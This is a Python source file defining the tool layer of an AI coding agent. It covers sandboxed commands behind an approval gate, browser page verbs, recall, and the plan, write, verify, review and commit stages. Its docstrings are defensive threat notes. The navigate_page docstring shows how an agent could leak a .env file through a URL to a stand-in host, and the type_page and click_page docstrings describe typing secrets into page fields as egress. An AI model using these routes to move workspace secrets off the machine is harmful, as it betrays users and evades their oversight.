"""The conductor's tools: the moves and the reads it can make, each a door onto something the pipeline already does.

A tool here is a thin caller of an existing capability (a read, a search, a stage, the write gate), never a new
capability: a skill or a model reply can sequence them and nothing more (docs/00 §6.9). `ExecutorService` owns
the state these act on and is named here only for its type.
"""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass
from typing import TYPE_CHECKING, Any

from engine.executor_support import (
    AgentOutputInvalid,
    CriticRejection,
    TestsFailed,
    WriteWithdrawn,
    _verifier_outcome,
)
from engine.fs import FileSystemService, PathEscapeError
from engine.library import LibraryService, format_command, format_read, format_search
from engine.models import Goal, PlanStep
from engine.providers import ProviderError
from engine.recall import (
    MAX_THREADS,
    format_recall,
    format_thread_recall,
    search as search_recall,
    search_threads,
)
from engine.sandbox import CommandNotAllowed, validate_argv
from engine.skills import SkillSet
from engine.webview_bridge import BridgeUnavailable, format_action, format_navigation, format_page

if TYPE_CHECKING:
    from engine.executor import ExecutorService


#: What a page verb says when there is no page. One sentence, named, because a
#: missing browser is the *normal* answer in a benchmark, a CLI turn and most
#: of the suite — and a verb that raised there would fail every turn on every
#: machine that is not the desktop app.
_NO_BROWSER = (
    "There is no browser attached to this engine, so there is no page to act "
    "on. This is the normal answer outside the desktop app — a command-line "
    "engine, a benchmark and a headless test all have no page. Ask the user "
    "to open the page in Codify, or answer from the workspace."
)


@dataclass
class _Conducted:
    """What one conductor run produced, and whether it got somewhere worth keeping.

    The distinction this exists for: a conductor that *declined* to plan — it
    answered instead, having judged that no change was needed — has made a
    decision the engine should honour. A conductor that *failed* to plan — its
    model errored, or it spent its whole call budget and produced neither an
    answer worth having nor a plan — has not decided anything, and falling back
    to the engine's own sequence is strictly better than failing the turn.

    Those two look identical from the reply text alone, which is why they are
    modelled instead of inferred.
    """

    answer: str | None
    exhausted: bool
    planned: bool
    # The person cancelled while it ran. Neither an answer nor a failure: the turn is over,
    # and nothing this run produced may be published or allowed to move the goal's status.
    cancelled: bool = False
    # There was no conductor to run: the provider cannot call tools, or no model is chosen. That is the
    # documented degradation to the engine's own path (docs/09 §10.9), not a failure, and the log must not
    # say a model failed when none was ever called.
    unavailable: bool = False

    @property
    def finished(self) -> bool:
        if self.cancelled:
            return False
        if self.answer is None:
            return False
        if not self.answer.strip() and not self.planned:
            # A model that said nothing has not declined anything. An empty reply (a model that spent its
            # budget thinking, a context overflow, a server that answered `{}`) is not a decision to
            # honour, and publishing it as "(no answer)" made the turn look finished when nothing had
            # been said or done.
            return False
        if self.exhausted and not self.planned:
            return False
        return True

    def explanation(self) -> str:
        if self.answer is None:
            return "its model failed, so there is no answer and no plan"
        if not self.answer.strip():
            return "its model said nothing, so there is no answer and no plan"
        return "it used every call it was given without producing a plan"


class ConductorTools:
    """The conductor's tools, each bound to the service the pipeline uses.

    This table *is* the conductor's authority, and it is deliberately made
    of the same calls the pipeline already makes — `LibraryService.read` is
    what serves the librarian's reads, `SandboxService.run_command` is what
    the verifier's argv goes through. So docs/00 §6.6 holds for a tool call
    exactly as it holds for a verifier: the model asks, `validate_argv`
    decides, and an unlisted command is refused however it was phrased.

    What replaced `delegate`: the seven stage moves below. `delegate` ran
    the whole recipe — librarian, design, planner — whether or not the
    request needed it, which made the sequence a property of the code rather
    than a decision of the decider. Each stage is now reachable on its own.

    What did *not* change is who is allowed to do what. `write` is the
    fixer's method under the fixer's validation and it refuses while the
    goal is unapproved (docs/00 §6.9); `verify` is the verifier's, so the
    command it proposes goes through `validate_argv` in `test` mode exactly
    as a step's own verification does (docs/00 §6.6). The conductor chooses
    *when* each runs. It cannot make any of them run without their checks.
    """

    #: Every name this table answers to, in the order the menu lists them. A tool
    #: cannot be defined and left out of the menu, and a name here cannot be a tool
    #: that does not exist — the table and the menu used to be two hand-maintained
    #: literals inside one function.
    NAMES: tuple[str, ...] = (
        'read_file',
        'search_code',
        'git_history',
        'run_command',
        'read_page',
        'navigate_page',
        'click_page',
        'type_page',
        'recall',
        'recall_threads',
        'recon',
        'design',
        'plan',
        'write',
        'verify',
        'review',
        'summarize',
        'use_skill',
    )

    def __init__(
        self, service: ExecutorService, goal_id: str, goal: Goal, root: str, skills: SkillSet
    ) -> None:
        # A *named* method per tool, rather than a closure only
        # `_conductor_dispatch` could reach: that is what lets one be tested on
        # its own, and what makes the authority above readable in one place.
        # `service` is the pipeline that owns every call a tool makes.
        self.service = service
        self.goal_id = goal_id
        self.goal = goal
        self.root = root
        self.skills = skills
        # Resolved once, here, rather than in every tool that needs one.
        self.library = LibraryService(root)
        self.git = service.git
        self.ws = service.workspaces.get(goal.workspace_id)
        # `state` is what one move hands to the next inside a single conductor
        # run: the files a write produced, the verdict a verify returned. It is
        # keyed by step so a conductor working through three steps cannot mix
        # one step's diff into another's review.
        self.state: dict[str, dict[str, Any]] = {}

    def step_for(self, step_id: str) -> PlanStep | str:
        """The step, or the sentence explaining which ids exist.

        Returning the refusal rather than raising it is the same rule the
        loop holds everywhere else: a model that passed a stale or invented
        id gets something it can act on, not a dead turn.
        """
        steps = self.service.goals.steps(self.goal_id)
        for candidate in steps:
            if candidate.id == step_id:
                return candidate
        if not steps:
            return (
                "There is no step with that id, because this goal has no "
                "steps yet. Call `plan` first (and `recon` before it if there "
                "is no evidence)."
            )
        listed = ", ".join(f"{s.id} ({s.title!r})" for s in steps)
        return f"There is no step called {step_id!r}. The steps are: {listed}"

    async def use_skill(self, args: dict[str, Any]) -> str:
        """One skill's instructions, or the menu if the name is wrong.

        The body is returned as a tool result and nowhere else. It is never
        executed or imported: a skill is text a model reads, so the worst a
        hostile one in a cloned repository can do is argue, and an argument
        cannot widen a tool.
        """
        name = str(args.get("name") or "").strip().lower()
        found = self.skills.get(name)
        if found is None:
            return (
                f"There is no skill called {name!r}. Available:\n{self.skills.menu()}"
            )
        self.service._log(self.goal_id, None, "info", f"conductor loaded the {found.name} skill")
        return found.body

    async def read_file(self, args: dict[str, Any]) -> str:
        return format_read(
            self.library.read(
                str(args.get("path") or ""),
                args.get("offset"),
                args.get("limit"),
            )
        )

    async def search_code(self, args: dict[str, Any]) -> str:
        # A search walks the whole workspace and can spawn ripgrep, so it is
        # off the event loop too — see `run_command` for why that matters.
        result = await asyncio.to_thread(
            self.library.search,
            str(args.get("query") or ""),
            glob=str(args["glob"]) if args.get("glob") else None,
            regex=bool(args.get("regex")),
            mode=str(args["mode"]) if args.get("mode") else None,
        )
        return format_search(result)

    async def git_history(self, args: dict[str, Any]) -> str:
        # `GitService.read_only` owns the subcommand allowlist. The
        # conductor's authority is that list, and it lives with the service
        # that runs git rather than in a table here that could drift from it.
        # A thread, because git is a subprocess: a `log` over a long history
        # used to hold the event loop behind it.
        return await asyncio.to_thread(self.git.read_only, self.root, args.get("args") or [])

    async def run_command(self, args: dict[str, Any]) -> str:
        argv = args.get("argv") or []
        if not isinstance(argv, list) or not all(isinstance(a, str) for a in argv):
            return "run_command takes a list of strings, e.g. [\"pytest\", \"-q\"]"
        reason = str(args.get("reason") or "").strip()
        argv = [str(a) for a in argv]
        # What the test allowlist admits is the repository's *own code*: `python3
        # evil.py`, `pytest` (which imports every conftest.py it finds), `npm run` of any
        # script, `cargo test`, `go test`. docs/03 §1.4 accepts that for a goal a person
        # has approved. A turn has no approval step, so until the goal is RUNNING this
        # tool is the librarian's: `ls`, `wc` and read-only git, which cannot execute
        # anything in the workspace. The gate is `write`'s own, and it reads the stored
        # status, so nothing the model says can move it.
        approved, _ = self.service._write_allowed(self.goal_id)
        if not approved:
            fs = FileSystemService(self.root)
            try:
                validate_argv(argv, fs, mode="read_only")
            except CommandNotAllowed as refusal:
                try:
                    validate_argv(argv, fs, mode="test")
                except CommandNotAllowed:
                    # Not a command any mode allows: the ordinary refusal, and it must
                    # not suggest that approval would change it.
                    raise refusal from None
                raise CommandNotAllowed(
                    f"`{argv[0]}` runs this project's own code, and this goal has no "
                    "approved plan: nothing in the repository runs until the user has "
                    "approved a plan by starting it. Until then only reading commands run "
                    "(ls, wc, git history). Say what you would run and why, propose the "
                    "change as a plan, and stop."
                ) from None
        # `mode="test"` once approved, the same mode the verifier's argv runs in. The
        # conductor is not the librarian, so it gets the test allowlist rather than the
        # read-only one — but it does not get a *wider* one.
        #
        # Off the event loop, and under the lock the verifier already takes.
        # This runs a real process for up to two minutes and it used to run it
        # *in* the loop: every WebSocket tick, /health probe and cancel request
        # queued behind the command, so watching a long test made the app
        # report itself offline. The lock is the other half of the same rule —
        # the sandbox is one shared workspace, so a concurrent step's test must
        # not run in the tree this command is measuring.
        # `to_thread` re-raises in the awaiter, so a refusal still arrives as
        # `CommandNotAllowed` — the behaviour this tool already had.
        async with self.service._sandbox_lock:
            result = await asyncio.to_thread(
                self.service.sandbox.run_command, self.root, argv,
                mode="test" if approved else "read_only",
            )
        return format_command(result) + (f"\n(reason given: {reason})" if reason else "")

    async def read_page(self, args: dict[str, Any]) -> str:
        """What the browser tab the user is looking at is showing.

        Read-only and outward-facing in the one sense that matters: it
        cannot navigate, cannot run anything and cannot reach the network
        from here. The page it reads is whatever the user put there — the
        model did not choose the URL and cannot change it — which is what
        makes this safe to offer to a role that reasons about untrusted
        text all day: the text arrives already labelled as a website's.

        A missing bridge is the normal case in a benchmark, a CLI turn and
        most of the test suite, so it is a sentence rather than an
        exception. An engine that raised here would fail every turn on
        every machine that is not the desktop app.
        """
        bridge = self.service.bridge
        if bridge is None:
            return (
                "There is no browser attached to this engine, so there is "
                "no page to read. This is the normal answer outside the "
                "desktop app — a command-line engine, a benchmark and a "
                "headless test have no page. Answer from the workspace, or "
                "ask the user to paste what they are looking at."
            )
        tab = str(args.get("tab") or "").strip() or None
        selector = str(args.get("selector") or "").strip() or None
        self.service._log(
            self.goal_id, None, "info",
            f"conductor read the page in {tab or 'the active browser tab'}",
        )
        try:
            page = await bridge.read_page(
                tab=tab, selector=selector, max_chars=args.get("max_chars")
            )
        except BridgeUnavailable as exc:
            return f"No page to read. {exc}"
        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
            return f"That page read did not come back. {exc}"
        return format_page(page)

    async def recall(self, args: dict[str, Any]) -> str:
        """What this workspace has already learned the hard way.

        Read-only, and pointed at this workspace's own outcome history
        rather than at the web or at another project's rows. It cannot
        change anything: `RecallService` has no write path at all, so
        there is nothing here for a model to escalate into.

        Scoped by `goal.workspace_id` rather than by anything the model
        could influence. A user with two repositories open must not have
        one's failures recalled into the other's turns, and doing the
        filter in SQL rather than in Python means the other workspace's
        rows are never even read to decide that.
        """
        query = str(args.get("query") or "").strip()
        if not query:
            return (
                "recall needs something to look for — an error code, a "
                "message fragment, a path or a stage name."
            )
        days = args.get("days")
        rows = self.service.goals.recall_events(
            self.goal.workspace_id,
            window_days=int(days) if isinstance(days, int) else 0,
        )
        result = search_recall(rows, query, limit=int(args.get("limit") or 8))
        self.service._log(
            self.goal_id, None, "info",
            f"conductor recalled {result.get('matched', 0)} past event(s) "
            f"for {query[:120]!r}",
        )
        return format_recall(result)

    async def recall_threads(self, args: dict[str, Any]) -> str:
        """What earlier threads here were about, and how their runs ended.

        The thread-grain sibling of `recall`: that reads events inside
        runs, this reads the conversation history itself. Scoped by
        `goal.workspace_id` in the same way, for the same reason — another
        workspace's threads are never read to be discarded.
        """
        rows = self.service.goals.thread_recall(self.goal.workspace_id)
        result = search_threads(rows, args.get("query"), limit=int(args.get("limit") or MAX_THREADS))
        query = str(args.get("query") or "").strip()
        self.service._log(
            self.goal_id, None, "info",
            f"conductor recalled {result.get('count', 0)} thread(s)"
            + (f" matching {query[:120]!r}" if query else " (most recent)"),
        )
        return format_thread_recall(result)

    async def navigate_page(self, args: dict[str, Any]) -> str:
        """Move the user's tab somewhere the model picked.

        The one tool here that changes something the user can see, so it is
        worth being exact about where the authority is: the model proposes
        a URL and this engine does not decide whether it is allowed. The
        shell's `parse_navigation` does, in Rust, on the URL that arrives
        there — and it is the *same function* the user's own clicks go
        through, so a model-proposed address meets the guard rather than a
        copy of it. The redirect that follows is guarded again by
        `on_navigation`, exactly as it is for a person.

        What this cannot do is escalate the model's *authority*: the
        destination is another page in the same embedded webview, which
        holds no capability and cannot reach the engine.

        **What it does not prevent, and the guard above cannot.** The model
        can put anything it has read into the address it proposes, and
        `parse_navigation` admits any public http(s) URL — so
        `navigate_page("https://elsewhere.example/?d=<contents of .env>")`
        is a one-call way out of the machine for workspace contents, needing
        no approval, and leaving nothing in the transcript but the address.
        The guard decides *where* a navigation may go; nothing in this
        engine can decide whether the address is being used to carry data
        out, because the address is the payload. That is the thing to weigh
        before widening what a conductor turn may read.
        """
        bridge = self.service.bridge
        if bridge is None:
            return (
                "There is no browser attached to this engine, so there is "
                "no tab to move. This is the normal answer outside the "
                "desktop app. Give the user the address to open instead."
            )
        url = str(args.get("url") or "").strip()
        tab = str(args.get("tab") or "").strip() or None
        # Logged before the navigation, not after: this is the one tool
        # whose effect the user sees, and the transcript line is the only
        # place they will find out it happened.
        self.service._log(
            self.goal_id, None, "info",
            f"conductor moved {tab or 'the active browser tab'} to {url[:200]}",
        )
        try:
            moved = await bridge.navigate(url, tab=tab)
        except BridgeUnavailable as exc:
            return f"That navigation did not happen. {exc}"
        except Exception as exc:  # noqa: BLE001 — the guard's verdict is not our bug
            return f"That navigation did not happen. {exc}"
        return format_navigation(moved)

    async def click_page(self, args: dict[str, Any]) -> str:
        """Click what a selector names on the page the user is looking at.

        The second tool here that changes what someone can see, and the
        authority is the same as the navigation's: the model picks the
        element, the page performs the click, and every navigation that
        follows is met by the shell's own `parse_navigation` and by
        `on_navigation` — the same guard a person's own click goes
        through. As with `navigate_page`, this moves authority nowhere; the
        webview holds no capability and cannot reach the engine.

        It is also the second half of `type_page`, and the half that sends:
        a click on a submit control posts whatever a previous `type_page`
        put in a field, and the address it posts to is the page's choice,
        not this engine's. `type_page` alone was described as unable to
        submit anything, which was true of this tool's absence and is not
        true of the pair.
        """
        bridge = self.service.bridge
        if bridge is None:
            return _NO_BROWSER
        selector = str(args.get("selector") or "").strip()
        tab = str(args.get("tab") or "").strip() or None
        self.service._log(
            self.goal_id, None, "info",
            f"conductor clicked {selector!r} in {tab or 'the active browser tab'}",
        )
        try:
            done = await bridge.click(selector, tab=tab)
        except BridgeUnavailable as exc:
            return f"That click did not happen. {exc}"
        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
            return f"That click did not happen. {exc}"
        return format_action(done, "click")

    async def type_page(self, args: dict[str, Any]) -> str:
        """Put text into a field on the page the user is looking at.

        The narrowest of the four page verbs and the one with the most
        room to do damage, because it is the only one that writes. It is
        therefore also the one whose result says the least: the engine has
        not submitted anything, and what it typed may not have gone
        anywhere.

        "May not" rather than "has not", because a page sends on its own
        terms: a search box that queries on every keystroke is ordinary
        web behaviour, and this tool cannot see it happen. So typing a
        secret into a field a page watches is already an egress, and
        `click_page` on a submit control is the same act in one call.
        """
        bridge = self.service.bridge
        if bridge is None:
            return _NO_BROWSER
        selector = str(args.get("selector") or "").strip()
        text = str(args.get("text") or "")
        tab = str(args.get("tab") or "").strip() or None
        self.service._log(
            self.goal_id, None, "info",
            f"conductor typed {len(text)} character(s) into {selector!r} in "
            f"{tab or 'the active browser tab'}",
        )
        try:
            done = await bridge.type_text(selector, text, tab=tab)
        except BridgeUnavailable as exc:
            return f"That text was not typed. {exc}"
        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
            return f"That text was not typed. {exc}"
        return format_action(done, "type")

        # ── the stage moves ────────────────────────────────────────────────
    async def recon(self, args: dict[str, Any]) -> str:
        task = str(args.get("task") or "").strip()
        if not task:
            return "recon needs a task saying what to find out."
        self.service._log(self.goal_id, None, "info", f"conductor sent the librarian: {task}")
        try:
            async with self.service._stage(self.goal_id, "librarian", "librarian") as lib_stage:
                evidence = await self.service._librarian(self.goal_id, self.goal, self.ws, task=task)
                lib_stage.record("incomplete" if evidence.get("capped") else "pack")
        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
            return (
                f"The librarian could not run ({getattr(exc, 'code', 'error')}: "
                f"{exc}). You may plan without evidence, but say in your answer "
                "that the workspace was not looked at."
            )
        return self.service._evidence_text(evidence)

    async def design(self, args: dict[str, Any]) -> str:
        task = str(args.get("task") or "").strip()
        if not task:
            return "design needs a task saying what direction to lock."
        evidence = self.service._evidence_for(self.goal_id)
        if not evidence:
            return (
                "There is no evidence for the designer to decide from. Call "
                "`recon` first, then `design`."
            )
        try:
            async with self.service._stage(self.goal_id, "design", "design") as design_stage:
                locked = await self.service._design(self.goal_id, self.goal, self.ws, evidence, task=task)
                design_stage.record("contract" if locked else "declined")
        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
            return (
                f"The designer could not run ({getattr(exc, 'code', 'error')}: "
                f"{exc}). Plan without a locked direction, and say so."
            )
        if not locked:
            return "The designer declined to lock a direction for this request."
        return self.service._design_text(locked)

    async def plan(self, args: dict[str, Any]) -> str:
        task = str(args.get("task") or "").strip()
        existing = self.service.goals.steps(self.goal_id)
        if existing:
            return (
                f"This goal already has a plan ({len(existing)} step"
                f"{'s' if len(existing) != 1 else ''}: {', '.join(s.title for s in existing)}). "
                "Do not plan twice: tell the user what the steps are and stop."
            )
        evidence = self.service._evidence_for(self.goal_id)
        if not evidence:
            # The one guard that has to stay in code rather than in the
            # prompt: a plan written against a guessed file layout edits the
            # wrong files, and telling a model to recon first does not stop a
            # model that has decided it already knows.
            return (
                "There is no evidence yet, and a plan built on a guess edits "
                "the wrong files. Call `recon` first, then call `plan` again."
            )
        try:
            await self.service._plan_steps(
                self.goal_id, self.goal, self.ws, evidence, self.service._design_for(self.goal_id),
                task=task or None,
            )
        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
            return (
                f"Planning failed ({getattr(exc, 'code', 'error')}: {exc}). "
                "Nothing was written and the goal is not planned."
            )
        refreshed = self.service.goals.get(self.goal_id)
        steps = self.service.goals.steps(self.goal_id)
        return json.dumps({
            "status": refreshed.status,
            "steps": [
                {"step_id": s.id, "title": s.title, "order": s.ordinal}
                for s in steps
            ],
            "note": (
                "The plan is waiting for the user to approve it. Nothing has "
                "been written and nothing can be until they start it. Tell "
                "them what the steps are and stop."
            ),
        }, default=str)

    async def write(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        instructions = str(args.get("instructions") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        allowed, why = self.service._write_allowed(self.goal_id)
        if not allowed:
            return why
        if not instructions:
            return "write needs instructions: what should change."
        fs = FileSystemService(self.ws.root_path)
        try:
            async with self.service._stage(self.goal_id, "fixer", "fixer", step.id) as fix_stage:
                summaries, _wants_pass = await self.service._fixer(
                    self.goal_id, step, fs, self.goal.dry_run, self.service._evidence_for(self.goal_id),
                    guidance=instructions,
                )
                changed = [s for s in summaries if s.get("changed", True)]
                fix_stage.record("wrote" if changed else "no_change")
        except WriteWithdrawn as exc:
            return str(exc)
        except (AgentOutputInvalid, ProviderError, PathEscapeError) as exc:
            return (
                f"The fixer failed on that step ({getattr(exc, 'code', 'error')}: "
                f"{exc}). Nothing further was written for it."
            )
        self.state.setdefault(step.id, {})["files"] = summaries
        return json.dumps({
            "step_id": step.id,
            "changed": [
                {"path": s.get("path"), "op": s.get("op", "write")}
                for s in summaries if s.get("changed", True)
            ],
            "dry_run": bool(self.goal.dry_run),
            "note": (
                "This was a dry run: the files were proposed, not written. "
                if self.goal.dry_run else
                "Call `verify` next: a change that has not been run is one "
                "nobody has seen work."
            ),
        }, default=str)

    async def verify(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        summaries = self.state.get(step.id, {}).get("files")
        if summaries is None:
            return (
                "Nothing has been written for that step in this run. Call "
                "`write` first — verification is meant to judge a change, "
                "and there is none."
            )
        try:
            async with self.service._stage(self.goal_id, "verifier", "verifier", step.id) as v:
                outcome = await self.service._verifier(
                    self.goal_id, step, self.ws, self.service._evidence_for(self.goal_id), diffs=summaries,
                )
                v.record(_verifier_outcome(outcome))
        except TestsFailed as exc:
            # The verifier's own contract: a failed run is the verdict, and
            # it raises it as control flow inside `run_step`. Here it is a
            # value, because the conductor is the thing that decides what to
            # do about a failure — retry, re-plan, or report it.
            outcome = self.service._last_test_result(self.goal_id, step.id)
            self.state.setdefault(step.id, {})["test"] = outcome
            return "Verification FAILED. " + json.dumps({
                "reason": str(exc), "outcome": outcome,
            }, default=str)
        except (AgentOutputInvalid, ProviderError) as exc:
            return (
                f"The verifier could not run ({getattr(exc, 'code', 'error')}: "
                f"{exc}). This step is unverified."
            )
        self.state.setdefault(step.id, {})["test"] = outcome
        return json.dumps({"passed": True, "outcome": outcome}, default=str)

    async def review(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        summaries = self.state.get(step.id, {}).get("files")
        if summaries is None:
            return (
                "There is nothing to review for that step: it has not been "
                "written in this run. Call `write` first."
            )
        outcome = self.state.get(step.id, {}).get("test") or self.service._last_test_result(
            self.goal_id, step.id
        )
        if not outcome:
            return (
                "That step has no test verdict yet, and a review without one "
                "cannot tell working code from broken code. Call `verify` first."
            )
        fs = FileSystemService(self.ws.root_path)
        try:
            async with self.service._stage(self.goal_id, "critic", "critic", step.id) as c:
                await self.service._critic(
                    self.goal_id, step, fs, summaries, self.service._evidence_for(self.goal_id),
                    outcome, ws_root=self.ws.root_path,
                )
                c.record("approve")
        except CriticRejection as exc:
            # Recorded here because the stage block above never reaches its
            # `record` on this path, and a critic that asked for changes is
            # the one outcome a reader most needs to see.
            self.service.goals.publish(self.service._event(
                self.goal_id, step.id, "stage_result",
                {
                    "stage": "critic", "role": "critic", "ordinal": 0,
                    "outcome": "request_changes", "detail": str(exc),
                    "duration_ms": 0, "tokens": 0, "calls": 0,
                },
            ))
            return (
                "The critic asked for changes and did not approve: " + str(exc)
                + "\nEither act on those reasons with `write`, or tell the user "
                "plainly that you are not going to and why."
            )
        self.state.setdefault(step.id, {})["reviewed"] = True
        return "The critic approved this step. Call `summarize` to record and commit it."

    async def summarize(self, args: dict[str, Any]) -> str:
        step_id = str(args.get("step_id") or "").strip()
        step = self.step_for(step_id)
        if isinstance(step, str):
            return step
        summaries = self.state.get(step.id, {}).get("files")
        if summaries is None:
            return "That step was not written in this run, so there is nothing to record."
        if not self.state.get(step.id, {}).get("reviewed"):
            # Not a formality. The commit is the point of no return for a
            # step, and the review is the only thing standing between a
            # model's opinion of its own work and the user's git history.
            return (
                "That step has not been reviewed. Call `review` first, and "
                "commit it only if the critic approved."
            )
        outcome = self.state.get(step.id, {}).get("test") or self.service._last_test_result(
            self.goal_id, step.id
        )
        try:
            async with self.service._stage(self.goal_id, "scribe", "scribe", step.id) as s:
                s.record(
                    await self.service._scribe(
                        self.goal_id, step, summaries, self.ws.root_path, self.goal.dry_run, outcome,
                    )
                )
        except (AgentOutputInvalid, ProviderError) as exc:
            return f"The scribe could not record that step ({exc})."
        self.service._set_step(self.goal_id, step, "COMPLETED")
        return "That step is recorded and committed."
